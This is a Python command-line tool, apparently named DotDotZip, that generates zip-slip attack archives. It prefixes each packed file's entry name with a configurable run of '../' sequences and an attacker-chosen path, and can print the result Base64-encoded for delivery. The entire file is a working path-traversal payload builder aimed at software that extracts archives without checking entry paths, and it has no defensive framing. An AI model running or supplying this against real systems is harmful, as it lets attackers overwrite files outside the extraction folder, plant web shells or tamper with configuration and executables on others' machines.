import tomllib
import base64

from zipfile import ZipFile
from argparse import ArgumentParser
from io import BytesIO
from importlib import metadata

def version_from_pyproject_toml():
    try:
        with open("pyproject.toml", "rb") as f:
            pyproject_data = tomllib.load(f)
            return pyproject_data.get("project", {}).get("version", "Unknown")
    except FileNotFoundError:
        return "Unknown"

def version_redundant():
    try:
        return metadata.version(__package__)
    except ValueError:
        return version_from_pyproject_toml()
    except metadata.PackageNotFoundError:
        return version_from_pyproject_toml()

def create_payload(zip_name, traverse_count, prepend_path, pack_files):
    with ZipFile(zip_name, 'w') as zf:
        traverse_str = '../' * traverse_count
        for file_name in pack_files:
            try:
                zf.write(file_name, arcname=f"{traverse_str}{prepend_path}/{file_name}")
            except FileNotFoundError:
                print(f"Error: The file '{file_name}' does not exist.")

def main():
    parser = ArgumentParser(description=f"DotDotZip v. {version_redundant()}")
    
    parser.add_argument("--traverse-count", type=int, default=5, help="Number of '../' sequences to prepend")
    parser.add_argument("--zip-name", type=str, help="Name of the output ZIP archive (leave blank to output Base64 encoded ZIP to the console)")
    parser.add_argument("--prepend-path", type=str, required=True, help="Extra path to prepend")
    parser.add_argument("--pack-files", type=str, nargs='+', required=True, help="Names of files to pack")
    
    args = parser.parse_args()
    
    if not args.zip_name:
        with BytesIO() as zip_buffer:
            create_payload(zip_buffer, args.traverse_count, args.prepend_path, args.pack_files)
            zip_buffer.seek(0)
            print(base64.b64encode(zip_buffer.read()).decode('utf-8'))
    else:
        create_payload(args.zip_name, args.traverse_count, args.prepend_path, args.pack_files)

if __name__ == '__main__':
    main()